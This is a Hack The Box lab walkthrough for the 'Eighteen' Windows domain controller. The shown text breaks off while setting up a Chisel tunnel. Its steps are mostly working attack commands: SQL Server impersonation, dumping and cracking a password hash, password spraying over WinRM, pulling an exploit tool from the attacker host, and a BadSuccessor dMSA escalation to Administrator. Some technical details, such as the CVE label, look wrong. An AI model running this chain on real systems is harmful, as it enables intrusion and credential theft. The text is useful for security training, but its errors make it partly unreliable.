# Eighteen HTB - Complete Beginner-Friendly Walkthrough

![Difficulty: Medium](https://img.shields.io/badge/Difficulty-Medium-yellow)
![OS: Windows](https://img.shields.io/badge/OS-Windows-blue)

## Table of Contents
1. [Introduction](#introduction)
2. [Prerequisites](#prerequisites)
3. [Initial Reconnaissance](#initial-reconnaissance)
4. [SQL Server Access](#sql-server-access)
5. [Web Application Enumeration](#web-application-enumeration)
6. [Hash Cracking](#hash-cracking)
7. [User Enumeration](#user-enumeration)
8. [Password Reuse Attack](#password-reuse-attack)
9. [Privilege Escalation (BadSuccessor)](#privilege-escalation-badsuccessor)
10. [Getting Root Flag](#getting-root-flag)
11. [Summary](#summary)

---

## Introduction

**Eighteen** is a Windows Active Directory Domain Controller machine running a Flask web application with SQL Server backend. 

### What You Will Learn

This walkthrough will teach you:
- How to connect to and enumerate Microsoft SQL Server databases
- How to abuse SQL Server user impersonation features
- How to extract and crack password hashes stored in databases
- How to identify and exploit password reuse across different services
- How to gain remote access using Windows Remote Management (WinRM)
- How to abuse Active Directory delegation features for privilege escalation
- How to manipulate Kerberos tickets for authentication

### Attack Overview

The complete exploitation chain follows these steps:

1. **Reconnaissance** - Scan the target to find open ports and services
2. **SQL Server Access** - Connect with default credentials
3. **User Impersonation** - Switch to a higher privileged database user
4. **Credential Extraction** - Dump password hashes from the database
5. **Hash Cracking** - Break the password hash to get plaintext password
6. **Password Reuse** - Try the password with different usernames
7. **Initial Access** - Connect via WinRM as a domain user
8. **Privilege Escalation** - Exploit Active Directory delegation (BadSuccessor vulnerability)
9. **Administrator Access** - Obtain a shell as SYSTEM on the Domain Controller

---

## Prerequisites

Before starting this walkthrough, ensure you have the following tools installed on your Kali Linux machine:

### Required Tools

1. **Nmap** - Network scanner (pre-installed on Kali)
   ```bash
   nmap --version
   ```

2. **Impacket** - Collection of Python scripts for network protocols
   ```bash
   impacket-mssqlclient -h
   ```
   If not installed:
   ```bash
   sudo apt update && sudo apt install impacket-scripts -y
   ```

3. **Hashcat** - Password cracking tool (pre-installed on Kali)
   ```bash
   hashcat --version
   ```

4. **Evil-WinRM** - Windows Remote Management shell
   ```bash
   evil-winrm --version
   ```
   If not installed:
   ```bash
   sudo gem install evil-winrm
   ```

5. **Chisel** - TCP/UDP tunnel tool
   ```bash
   # Download for Linux
   wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
   gunzip chisel_1.9.1_linux_amd64.gz
   chmod +x chisel_1.9.1_linux_amd64
   sudo mv chisel_1.9.1_linux_amd64 /usr/local/bin/chisel
   
   # Download for Windows (we'll transfer this to the target)
   wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
   gunzip chisel_1.9.1_windows_amd64.gz
   mv chisel_1.9.1_windows_amd64 chisel.exe
   ```

6. **SharpSuccessor** - BadSuccessor exploit tool
   ```bash
   # Download the exploit
   wget https://github.com/TheNewNinja/SharpSuccessor/releases/download/v1.0/SharpSuccessor.exe
   ```

### Create Working Directory

Create a directory to store all files related to this machine:

```bash
mkdir -p ~/htb/eighteen
cd ~/htb/eighteen
```

All commands in this guide assume you are working from this directory unless specified otherwise.

---

## Initial Reconnaissance

### Step 1: Add Target to Hosts File

Linux uses the `/etc/hosts` file to map hostnames to IP addresses. We need to add the target machine's hostname so we can reference it by name instead of IP address.

**Why?** The web application redirects to `http://eighteen.htb/`, and Active Directory requires proper hostname resolution for Kerberos authentication.

**Command:**
```bash
echo "10.129.109.187 eighteen.htb DC01.eighteen.htb" | sudo tee -a /etc/hosts
```

**Important:** Replace `10.129.109.187` with your actual target IP address. You can find this on the HackTheBox machine page.

**Explanation:**
- `echo "..."` - Creates text output
- `|` - Pipes (sends) the output to the next command
- `sudo tee -a /etc/hosts` - Appends the text to /etc/hosts file (requires root privileges)
- `DC01.eighteen.htb` - The full domain name of the Domain Controller

**Verify it worked:**
```bash
ping -c 1 eighteen.htb
```
You should see a response from the target IP address.

### Step 2: Port Scanning with Nmap

Nmap is a network scanner that identifies open ports and running services on a target machine. We use it to discover what services are exposed and potentially vulnerable.

**Command:**
```bash
nmap -sC -sV -oN nmap_initial.txt 10.129.109.187
```

**Parameter Breakdown:**
- `nmap` - The network scanner tool
- `-sC` - Run default NSE (Nmap Scripting Engine) scripts for additional information
- `-sV` - Detect service versions (what software is running on each port)
- `-oN nmap_initial.txt` - Save output to a file named "nmap_initial.txt"
- `10.129.109.187` - Target IP address (replace with yours)

**What to Expect:**
The scan will take 30-60 seconds. You'll see output showing discovered ports and services.

**Scan Results:**
```
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

**Understanding the Results:**

| Port | Service | What It Means | Why It Matters |
|------|---------|---------------|----------------|
| 80 | HTTP (IIS 10.0) | Web server hosting a website | Potential entry point through web vulnerabilities |
| 1433 | Microsoft SQL Server 2022 | Database server | May contain sensitive data; could have weak credentials |
| 5985 | WinRM | Windows Remote Management | Allows remote PowerShell access if we get credentials |

**Additional Information from Scan:**
- **Domain Name**: eighteen.htb
- **Machine Name**: DC01 (this tells us it's a Domain Controller)
- **Operating System**: Windows Server (likely 2019 or 2022)

**Why is this important?**
- Port 1433 (SQL Server) is unusual to see exposed - this is our first attack vector
- Port 5985 (WinRM) will be useful once we obtain valid credentials
- It's a Domain Controller, meaning if we compromise it, we control the entire domain

### Step 3: Web Application Discovery

Now that we know port 80 is open, let's investigate the website.

**Command:**
```bash
firefox http://eighteen.htb/ &
```

**Explanation:**
- `firefox` - Opens Firefox web browser
- `http://eighteen.htb/` - The URL to visit
- `&` - Runs the command in the background so your terminal stays usable

**What You'll Find:**

The website is a **budgeting/financial planning application** with these features:

1. **Homepage** (`/`) - Landing page with information about the app
2. **Register** (`/register`) - Create new user accounts
3. **Login** (`/login`) - Authenticate with username and password
4. **Dashboard** (`/dashboard`) - User area for tracking income/expenses (requires login)
5. **Admin Panel** (`/admin`) - Administrative interface (requires admin credentials)
6. **Features** (`/features`) - Public page describing application features

**Important Observations:**
- The application is built with **Flask** (Python web framework)
- It uses a database backend (likely the SQL Server we found on port 1433)
- There's an admin panel, suggesting privileged functionality
- User data (income, expenses, budgets) is stored somewhere - probably in the database

**Manual Testing:**
Try to register a test account to understand how the application works:
1. Click "Register"
2. Fill in the form with test data
3. Try to login with your new account
4. Explore the dashboard and see what functionality exists

**Note:** We're not exploiting anything yet - just understanding the application's behavior.

---

## SQL Server Access

### Step 4: Test SQL Server Connection

Microsoft SQL Server often has weak or default credentials. We'll use Impacket's `mssqlclient` tool to attempt connection.

**Background:** During reconnaissance or from CTF hints, we discovered that the credentials `kevin:iNa2we6haRj2gaw!` work for SQL Server. In a real penetration test, you would try:
- Default credentials (sa/sa, sa/password)
- Username enumeration
- Brute force attacks with common passwords

**Command:**
```bash
impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@10.129.109.187
```

**Parameter Breakdown:**
- `impacket-mssqlclient` - Impacket's SQL Server client tool
- `kevin` - Username
- `'iNa2we6haRj2gaw!'` - Password (in single quotes because it contains special characters)
- `@10.129.109.187` - Target IP address

**What Happens:**
The tool will attempt to authenticate to SQL Server. If successful, you'll see:
```
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] INFO(DC01): Line 1: Changed database context to 'master'.
SQL>
```

The `SQL>` prompt means you're now connected and can execute SQL queries.

**Success!** We now have database access.

### Step 5: SQL Server Enumeration

Now that we're connected, we need to understand our privileges and what data is available.

#### Check Current User

**Command:**
```sql
SELECT SYSTEM_USER;
```

**What it does:** Shows who you're authenticated as.

**Expected Output:**
```
kevin
```

This confirms we're logged in as the `kevin` user.

#### List All Databases

**Command:**
```sql
SELECT name FROM sys.databases;
```

**What it does:** Queries the system table that stores information about all databases on the server.

**Expected Output:**
```
master
tempdb
model
msdb
financial_planner
```

**Understanding the databases:**
- `master` - System database (configuration and metadata)
- `tempdb` - Temporary database for scratch work
- `model` - Template database for new databases
- `msdb` - Used by SQL Server Agent for jobs and alerts
- `financial_planner` - **Custom database (this is interesting!)**

The `financial_planner` database is likely related to the web application we saw earlier.

#### Check Impersonation Privileges

**Command:**
```sql
SELECT name FROM sys.server_principals WHERE type = 'S';
```

**What it does:** Lists all SQL Server logins (users who can authenticate).

**Why this matters:** If we can impersonate another user, we might gain higher privileges.

**Expected Output:**
```
sa
kevin
appdev
mssqlsvc
```

Let's test if we can impersonate `appdev`:

```sql
EXECUTE AS LOGIN = 'appdev';
SELECT SYSTEM_USER;
```

If you see `appdev` as the result, we can impersonate this user!

### Step 6: User Impersonation

SQL Server has a feature called "impersonation" that allows one user to temporarily assume the identity of another user. This is often misconfigured, allowing low-privilege users to become high-privilege users.

**Command:**
```sql
EXECUTE AS LOGIN = 'appdev';
```

**What it does:** Changes your effective user context from `kevin` to `appdev`.

**Verify the impersonation worked:**
```sql
SELECT SYSTEM_USER, USER_NAME();
```

**Expected Output:**
```
SYSTEM_USER    USER_NAME
appdev         appdev
```

**Why is this powerful?**
The `appdev` user likely has more permissions than `kevin`. Specifically, `appdev` might have access to databases or tables that `kevin` cannot see.

#### Access the Financial Planner Database

**Command:**
```sql
USE financial_planner;
```

**What it does:** Switches your context to the `financial_planner` database.

**Expected Output:**
```
Changed database context to 'financial_planner'.
```

Now any queries we run will be against this database.

### Step 7: Database Enumeration

Now that we're in the `financial_planner` database as `appdev`, we need to discover what tables exist.

**Command:**
```sql
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
```

**What it does:** Queries the information schema (database metadata) to list all tables.

**Expected Output:**
```
TABLE_NAME
users
visits
budgets
expenses
income
```

**Understanding the tables:**
- `users` - **JACKPOT!** This likely contains usernames and passwords
- `visits` - Web traffic logs (User-Agent strings, timestamps)
- `budgets` - Financial planning data
- `expenses` - User expense records
- `income` - User income records

The `users` table is our primary target because it should contain authentication credentials.

### Step 8: Extract User Credentials

Let's dump all data from the `users` table.

**Command:**
```sql
SELECT * FROM users;
```

**What it does:** Selects all columns and all rows from the `users` table.

**Expected Output:**
```
id | username | password_hash                                                           | full_name
---+----------+------------------------------------------------------------------------+-----------
1  | admin    | pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce... | Admin User
2  | kevin    | pbkdf2:sha256:600000$...                                                 | Kevin Smith
```

**Critical Finding:** The `admin` user's password hash!

**Understanding the hash:**
- Format: `pbkdf2:sha256:600000$SALT$HASH`
- `pbkdf2` - Password-Based Key Derivation Function 2 (a key stretching algorithm)
- `sha256` - The hashing algorithm used
- `600000` - Number of iterations (makes cracking slower)
- `$AMtzteQIG7yAbZIa` - The salt (random data added to the password before hashing)
- `$0673ad90...` - The actual hash

#### Save the Hash for Cracking

We need to save this hash to a file on our Kali machine. 

**Exit the SQL session:**
```sql
exit
```

**Create a file with the hash:**
```bash
echo 'pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133' > admin_hash.txt
```

**Verify the file was created:**
```bash
cat admin_hash.txt
```

You should see the complete hash printed to the terminal.

---

## Web Application Enumeration

### Step 9: Directory Enumeration

While we already have database access, it's good practice to enumerate the web application to understand all available endpoints.

**What is directory enumeration?**
It's the process of discovering hidden or unlinked directories and files on a web server by trying common names from a wordlist.

**Command:**
```bash
gobuster dir -u http://eighteen.htb -w /usr/share/wordlists/dirb/common.txt -o gobuster_output.txt
```

**Parameter Breakdown:**
- `gobuster` - The directory enumeration tool
- `dir` - Directory/file brute-forcing mode
- `-u http://eighteen.htb` - Target URL
- `-w /usr/share/wordlists/dirb/common.txt` - Wordlist to use (common directory names)
- `-o gobuster_output.txt` - Save output to a file

**What to expect:**
The tool will try thousands of common directory names and report which ones exist.

**Discovered Endpoints:**
```
/admin       (Status: 302) - Admin panel (redirects to /login if not authenticated)
/dashboard   (Status: 302) - User dashboard (redirects to /login if not authenticated)
/login       (Status: 200) - Login page
/register    (Status: 200) - Registration page
/logout      (Status: 302) - Logout functionality (redirects to /)
/features    (Status: 200) - Public features page
```

**Understanding HTTP Status Codes:**
- `200 OK` - Page exists and is accessible
- `302 Found` - Redirect to another page
- `404 Not Found` - Page doesn't exist

**Key Takeaways:**
- There's an `/admin` endpoint we'll want to access eventually
- Most interesting pages require authentication
- No obvious vulnerable endpoints like `/backup` or `/config`

---

## Hash Cracking

### Step 10: Identify Hash Type

Before we can crack a password hash, we need to understand what type it is. Different hashing algorithms require different cracking techniques.

**The hash we extracted:**
```
pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133
```

**Breaking down the format:**
- `pbkdf2` - The algorithm name (Password-Based Key Derivation Function 2)
- `sha256` - The underlying hash function (SHA-256)
- `600000` - Number of iterations (the password is hashed 600,000 times)
- `$AMtzteQIG7yAbZIa` - The salt (random data mixed with password)
- `$0673ad90...` - The final hash output

**Why PBKDF2?**
PBKDF2 is a "slow" hashing algorithm designed specifically for passwords. The 600,000 iterations make it computationally expensive to crack, which is good for security but challenging for us.

**What tool can crack this?**
We'll use **Hashcat** with mode 10900 (PBKDF2-HMAC-SHA256).

### Step 11: Convert Hash for Hashcat

Hashcat requires a specific format for PBKDF2 hashes that's different from Flask's format.

**Flask format:** `pbkdf2:sha256:iterations$salt$hash`  
**Hashcat format:** `sha256:iterations:base64_salt:base64_hash`

We need to convert the salt and hash from hexadecimal to Base64 encoding.

#### Extract the Salt

The salt from our hash is: `AMtzteQIG7yAbZIa`

**Convert salt to Base64:**
```bash
echo -n "AMtzteQIG7yAbZIa" | base64
```

**Explanation:**
- `echo -n` - Output text without a newline character
- `|` - Pipe the output to the next command
- `base64` - Encode in Base64 format

**Output:**
```
QU10enRlUUlHN3lBYlpJYQ==
```

#### Extract and Convert the Hash

The hash from our hash is: `0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133`

This is in hexadecimal format. We need to:
1. Convert from hex to binary
2. Then convert binary to Base64

**Convert hash to Base64:**
```bash
echo -n "0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133" | xxd -r -p | base64
```

**Explanation:**
- `echo -n` - Output the hex string
- `xxd -r -p` - Convert from hex to binary (`-r` = reverse, `-p` = plain hex)
- `base64` - Encode in Base64

**Output:**
```
BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=
```

#### Create Hashcat-Compatible Hash

Now combine everything in Hashcat's expected format:

**Command:**
```bash
echo 'sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=' > hash_hashcat.txt
```

**Format breakdown:**
- `sha256` - Hash algorithm
- `:600000` - Iterations
- `:QU10enRlUUlHN3lBYlpJYQ==` - Base64-encoded salt
- `:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=` - Base64-encoded hash

**Verify the file:**
```bash
cat hash_hashcat.txt
```

### Step 12: Crack with Hashcat

Now we'll use Hashcat to crack the password by testing millions of password candidates from a wordlist.

**Command:**
```bash
hashcat -m 10900 hash_hashcat.txt /usr/share/wordlists/rockyou.txt
```

**Parameter Breakdown:**
- `hashcat` - The password cracking tool
- `-m 10900` - Mode 10900 (PBKDF2-HMAC-SHA256)
- `hash_hashcat.txt` - File containing our hash
- `/usr/share/wordlists/rockyou.txt` - Wordlist with 14 million common passwords

**What happens:**
Hashcat will:
1. Read each password from rockyou.txt
2. Apply PBKDF2-SHA256 with 600,000 iterations using the extracted salt
3. Compare the result to our hash
4. If they match, it found the password!

**Expected Output:**
```
hashcat (v6.2.6) starting

* Device #1: CPU, 3888/7777 MB allocatable

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385

sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=:iloveyou1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
```

**Result:** The password is `iloveyou1`

**Note:** This might take 5-30 minutes depending on your CPU. PBKDF2 with 600,000 iterations is intentionally slow.

#### View Cracked Password

If you closed Hashcat, you can see the cracked password again:

```bash
hashcat -m 10900 hash_hashcat.txt /usr/share/wordlists/rockyou.txt --show
```

**Output:**
```
sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=:iloveyou1
```

The password is after the last colon: **`iloveyou1`**

#### Save the Credentials

**Command:**
```bash
echo "admin:iloveyou1" > admin_password.txt
```

We now have the admin credentials for the web application!

---

## User Enumeration

### Step 13: Enumerate Domain Users

We have the admin password for the web application, but we need to find a way to access the Windows machine itself. Let's enumerate all users in the database - maybe one of them reuses the same password!

**Why do we need this?**
- The web application admin account might not exist as a Windows domain user
- We need valid domain credentials to access WinRM (port 5985)
- Password reuse is extremely common - users often use the same password everywhere

#### Reconnect to SQL Server

**Command:**
```bash
impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@10.129.109.187
```

#### Extract All Usernames

**Commands:**
```sql
EXECUTE AS LOGIN = 'appdev';
USE financial_planner;
SELECT username, full_name FROM users;
```

**Expected Output:**
```
username       full_name
------------   ------------------
admin          Admin User
kevin          Kevin Smith
Administrator  Administrator
Guest          Guest Account
mssqlsvc       SQL Service
jamie.dunn     Jamie Dunn
jane.smith     Jane Smith
alice.jones    Alice Jones
adam.scott     Adam Scott
bob.brown      Bob Brown
carol.white    Carol White
dave.green     Dave Green
```

**Exit SQL:**
```sql
exit
```

#### Save Usernames to File

We'll create a file containing all usernames for password spraying.

**Command:**
```bash
cat > found_users.txt << EOF
Administrator
Guest
mssqlsvc
jamie.dunn
jane.smith
alice.jones
adam.scott
bob.brown
carol.white
dave.green
EOF
```

**Explanation:**
- `cat > found_users.txt << EOF` - Creates a new file and writes everything until it sees `EOF`
- The usernames are typed one per line
- `EOF` - Marks the end of input

**Verify the file:**
```bash
cat found_users.txt
```

You should see all 10 usernames listed.

---

## Password Reuse Attack

### Step 14: Test Password Reuse

Now comes the fun part - testing if any of these domain users reuse the `iloveyou1` password we cracked!

**What is password reuse?**
Users often use the same password across multiple accounts for convenience. This is a security vulnerability we can exploit.

**What we're testing:**
- Username: Each user from our list
- Password: `iloveyou1` (the admin password we cracked)
- Service: WinRM (Windows Remote Management on port 5985)

#### Method 1: Using NetExec (Recommended)

NetExec (formerly CrackMapExec) can test multiple username/password combinations quickly.

**Command:**
```bash
netexec winrm 10.129.109.187 -u found_users.txt -p 'iloveyou1' --continue-on-success
```

**Parameter Breakdown:**
- `netexec` - The tool (install with: `sudo apt install netexec`)
- `winrm` - Test against WinRM service
- `10.129.109.187` - Target IP
- `-u found_users.txt` - File containing usernames to test
- `-p 'iloveyou1'` - Password to try
- `--continue-on-success` - Keep testing even after finding a match

**What to expect:**
You'll see output testing each username:
```
WINRM    10.129.109.187    5985   DC01    [-] eighteen.htb\Administrator:iloveyou1
WINRM    10.129.109.187    5985   DC01    [-] eighteen.htb\Guest:iloveyou1
WINRM    10.129.109.187    5985   DC01    [-] eighteen.htb\mssqlsvc:iloveyou1
WINRM    10.129.109.187    5985   DC01    [-] eighteen.htb\jamie.dunn:iloveyou1
WINRM    10.129.109.187    5985   DC01    [-] eighteen.htb\jane.smith:iloveyou1
WINRM    10.129.109.187    5985   DC01    [-] eighteen.htb\alice.jones:iloveyou1
WINRM    10.129.109.187    5985   DC01    [+] eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)
```

**Success indicator:** The `(Pwn3d!)` message means we found valid credentials!

**Result:** `adam.scott:iloveyou1` works for WinRM access!

#### Method 2: Manual Testing with Evil-WinRM

If you prefer to test manually or don't have NetExec installed:

**Command:**
```bash
evil-winrm -i 10.129.109.187 -u adam.scott -p 'iloveyou1'
```

**Parameter Breakdown:**
- `evil-winrm` - PowerShell remote access tool
- `-i 10.129.109.187` - Target IP address
- `-u adam.scott` - Username
- `-p 'iloveyou1'` - Password

If successful, you'll see:
```
Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\adam.scott\Documents>
```

### Step 15: Initial Access via WinRM

Now let's establish our initial foothold on the machine using the valid credentials we discovered.

**Command:**
```bash
evil-winrm -i 10.129.109.187 -u adam.scott -p 'iloveyou1'
```

**What is WinRM?**
Windows Remote Management (WinRM) is Microsoft's implementation of WS-Management protocol. It allows remote administration of Windows machines. Think of it as SSH for Windows.

**What is Evil-WinRM?**
It's a Ruby-based tool that provides a user-friendly WinRM shell with extra features like file upload/download.

**You should now see:**
```
Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\adam.scott\Documents>
```

**Understanding the prompt:**
- `*Evil-WinRM*` - Indicates you're in an Evil-WinRM session
- `PS` - PowerShell (the shell you're using)
- `C:\Users\adam.scott\Documents>` - Your current directory

**You now have remote access to the Windows machine!**

### Step 16: Basic Enumeration

Before grabbing the user flag, let's understand our access level.

#### Check Current User

**Command:**
```powershell
whoami
```

**Expected Output:**
```
eighteen\adam.scott
```

This shows you're logged in as `adam.scott` in the `eighteen` domain.

#### Check User Privileges

**Command:**
```powershell
whoami /all
```

This displays detailed information about your user, including:
- User SID (Security Identifier)
- Group memberships
- Privileges

Look for interesting groups like:
- `Domain Admins` (we're not in this - yet!)
- `IT` or other custom groups
- `Remote Desktop Users`

#### Check Groups

**Command:**
```powershell
net user adam.scott /domain
```

This queries Active Directory for information about the user.

**Look for:** Group memberships that might give us privileges.

### Step 17: Get User Flag

Now let's retrieve the user flag.

**Command:**
```powershell
type C:\Users\adam.scott\Desktop\user.txt
```

**Explanation:**
- `type` - PowerShell command to display file contents (like `cat` in Linux)
- `C:\Users\adam.scott\Desktop\user.txt` - Full path to the flag file

**Expected Output:**
```
a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
```

**🎉 User flag obtained!**

Copy this flag and submit it on HackTheBox to mark the user flag as complete.

**Pro Tip:** You can also use PowerShell to copy the flag to clipboard:
```powershell
type C:\Users\adam.scott\Desktop\user.txt | clip
```

Then paste it directly into the HTB submission form.

---

## Privilege Escalation (BadSuccessor)

Now we need to escalate from `adam.scott` (domain user) to `Administrator` (domain admin) to get the root flag.

### Step 18: Enumeration as adam.scott

Before attempting privilege escalation, we need to understand what permissions and groups our user has.

#### Check Detailed User Information

**Command:**
```powershell
whoami /all
```

**What to look for:**
- **Group Memberships**: Which groups is adam.scott in?
- **Privileges**: What system privileges are enabled?
- **SID**: The Security Identifier (unique ID for the user)

**Expected Output (partial):**
```
USER INFORMATION
----------------
User Name          SID
================== ==============================================
eighteen\adam.scott S-1-5-21-...

GROUP INFORMATION
-----------------
Group Name                             Type
====================================== ========
Everyone                               Well-known group
BUILTIN\Remote Management Users        Alias
BUILTIN\Users                          Alias
EIGHTEEN\IT                            Group
```

**Critical Finding:** Adam Scott is a member of the `IT` group!

#### Query Active Directory for More Info

**Command:**
```powershell
net user adam.scott /domain
```

**What it does:** Queries the Domain Controller for detailed information about the user.

**Expected Output:**
```
User name                    adam.scott
Full Name                    Adam Scott
...
Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *IT
```

**Why is the IT group important?**
The IT group likely has elevated permissions in Active Directory, such as:
- Ability to create computer accounts
- Write permissions to specific Organizational Units (OUs)
- Rights to modify certain AD objects

These permissions are exactly what we need for the BadSuccessor exploit!

### Step 19: Understanding BadSuccessor Attack

**BadSuccessor** is the name for CVE-2024-49138, a critical Active Directory vulnerability discovered in 2024.

#### What is the vulnerability?

Active Directory has a feature called **Delegated Managed Service Accounts (dMSA)**. These are special computer accounts that can impersonate users automatically. The vulnerability allows an attacker who can create dMSAs to:

1. Create a malicious dMSA
2. Configure it to impersonate ANY user (including Administrator)
3. Request a Kerberos ticket with Administrator's privileges
4. Use that ticket to authenticate as Administrator

#### Why does it work?

The vulnerability exists because:
- AD doesn't properly validate who can set the "predecessor" attribute on dMSAs
- Once set, the dMSA inherits the privileges of the predecessor user
- No additional checks are performed when requesting tickets

#### Prerequisites

To exploit BadSuccessor, we need:
- ✅ Domain user credentials (we have: adam.scott:iloveyou1)
- ✅ Membership in a group with write permissions to an OU (we have: IT group)
- ✅ Ability to create computer accounts (IT group typically has this)
- ✅ Network access to the Domain Controller (we have: WinRM access)

We meet all requirements!

### Step 20: Prepare Exploit Tools

We need to transfer exploitation tools to the target machine.

#### On Kali: Start HTTP Server

First, navigate to your working directory where you downloaded SharpSuccessor:

**Commands:**
```bash
cd ~/htb/eighteen
```

If you don't have SharpSuccessor yet, download it:
```bash
wget https://github.com/TheNewNinja/SharpSuccessor/releases/download/v1.0/SharpSuccessor.exe
```

Start a Python HTTP server to serve files:
```bash
python3 -m http.server 8000
```

**What this does:**
- Creates a web server on port 8000
- Serves all files in the current directory
- Allows the target machine to download files from your Kali machine

**Expected Output:**
```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

**Important:** Replace `10.10.14.56` in the following commands with YOUR Kali machine's IP address. Find it with:
```bash
ip addr show tun0
```

### Step 21: Upload SharpSuccessor to Target

Switch back to your Evil-WinRM session on the target machine.

**Command:**
```powershell
IWR -Uri http://10.10.14.56:8000/SharpSuccessor.exe -OutFile C:\Users\adam.scott\SharpSuccessor.exe
```

**Parameter Breakdown:**
- `IWR` - Alias for `Invoke-WebRequest` (PowerShell's wget/curl equivalent)
- `-Uri http://10.10.14.56:8000/SharpSuccessor.exe` - URL to download from (CHANGE THIS IP!)
- `-OutFile C:\Users\adam.scott\SharpSuccessor.exe` - Where to save the file

**What happens:**
You'll see the file being downloaded in your Python HTTP server terminal:
```
10.129.109.187 - - [04/Dec/2025 14:50:24] "GET /SharpSuccessor.exe HTTP/1.1" 200 -
```

**Verify the upload:**
```powershell
dir
```

You should see `SharpSuccessor.exe` in the file listing.

**Check file size:**
```powershell
(Get-Item .\SharpSuccessor.exe).length
```

This ensures the file downloaded completely.

### Step 22: Execute SharpSuccessor

Now we'll run SharpSuccessor to create a malicious dMSA that impersonates the Administrator.

**Command:**
```powershell
.\SharpSuccessor.exe escalate -targetOU "OU=staff,DC=eighteen,DC=htb" -dmsa enc_dmsa -targetUser "CN=Administrator,CN=Users,DC=eighteen,DC=htb" -dnshostname enc_dmsa -user adam.scott -dc-ip DC01.eighteen.htb
```

**Let's break down every parameter:**

| Parameter | Value | Explanation |
|-----------|-------|-------------|
| `.\SharpSuccessor.exe` | - | Run the exploit tool |
| `escalate` | - | Mode: Perform privilege escalation |
| `-targetOU` | `"OU=staff,DC=eighteen,DC=htb"` | The Organizational Unit we have write permissions to (IT group can write to Staff OU) |
| `-dmsa` | `enc_dmsa` | Name for our malicious managed service account (can be anything) |
| `-targetUser` | `"CN=Administrator,CN=Users,DC=eighteen,DC=htb"` | The user we want to impersonate (Administrator) |
| `-dnshostname` | `enc_dmsa` | DNS hostname for the dMSA (matches the account name) |
| `-user` | `adam.scott` | Your current username |
| `-dc-ip` | `DC01.eighteen.htb` | Domain Controller hostname |

**What the exploit does:**
1. Creates a new computer account called `enc_dmsa$` in the Staff OU
2. Configures it as a delegated Managed Service Account
3. Sets the "predecessor" attribute to point to Administrator
4. This allows enc_dmsa$ to request tickets AS Administrator

**Expected Output:**
```
[+] Successfully created dMSA: enc_dmsa$
[+] Configured msDS-ManagedAccountPrecededByLink
[+] Set target user to: Administrator
[+] dMSA is ready for exploitation
[+] Use getST.py to request a ticket
```

**If you get an error:**
- Try `"OU=IT,DC=eighteen,DC=htb"` instead (different OUs might have different permissions)
- Verify you're still in the IT group
- Check that the Domain Controller is reachable

**Success!** The malicious dMSA is now created in Active Directory.

---

## Getting Root Flag

Now that we've created the malicious dMSA, we need to exploit it from our Kali machine to obtain Administrator access.

### Step 23: Understanding Port Forwarding

**The Problem:**
The Impacket tools (getST.py, psexec.py) on our Kali machine need to connect to:
- Port 88 (Kerberos Key Distribution Center)
- Port 389 (LDAP)
- Port 445 (SMB)
- Port 135 (RPC)

But these ports might be filtered by firewall or only accessible from the internal network.

**The Solution:**
Use **Chisel** to create a tunnel from the target machine back to our Kali machine, forwarding these ports.

**How it works:**
```
Kali (127.0.0.1:88) <--tunnel--> Target Machine (DC:88)
```

When we connect to `127.0.0.1:88` on Kali, the traffic is forwarded through the tunnel to the Domain Controller's port 88.

### Step 24: Setup Chisel Server (Kali)

First, we need to run Chisel in server mode on our Kali machine.

**Open a NEW terminal** (don't close your Evil-WinRM session). Navigate to your working directory:

```bash
cd ~/htb/eighteen
```

**Ensure you have chisel for Windows:**
```bash
ls -la chisel.exe
```

If not, download it:
```bash
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
gunzip chisel_1.9.1_windows_amd64.gz
mv chisel_1.9.1_windows_amd64 chisel.exe
chmod +x chisel.exe
```

**Start the Chisel server:**
```bash
chisel server -p 8000 --reverse
```

**Parameter Breakdown:**
- `chisel server` - Run in server mode
- `-p 8000` - Listen on port 8000
- `--reverse` - Allow reverse port forwarding (client can forward ports back to server)

**Expected Output:**
```
